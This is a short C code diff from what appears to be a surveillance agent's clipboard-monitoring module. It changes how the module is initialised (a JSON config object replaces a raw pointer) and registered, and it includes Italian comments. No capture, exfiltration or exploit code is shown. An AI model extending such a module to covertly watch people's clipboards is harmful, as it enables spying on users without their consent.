@@ -107,19 +107,13 @@ DWORD __stdcall PM_ClipBoardStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_ClipBoardInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_ClipBoardInit(JSONObject elem)
 {
-	PM_ClipBoardStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
 
 void PM_ClipBoardRegister()
 {
-	// Non ha nessuna funzione di Dispatch
-	AM_MonitorRegister(PM_CLIPBOARDAGENT, NULL, (BYTE *)PM_ClipBoardStartStop, (BYTE *)PM_ClipBoardInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_ClipBoardInit(NULL, FALSE);
+	AM_MonitorRegister(L"clipboard", PM_CLIPBOARDAGENT, NULL, (BYTE *)PM_ClipBoardStartStop, (BYTE *)PM_ClipBoardInit, NULL);
 }
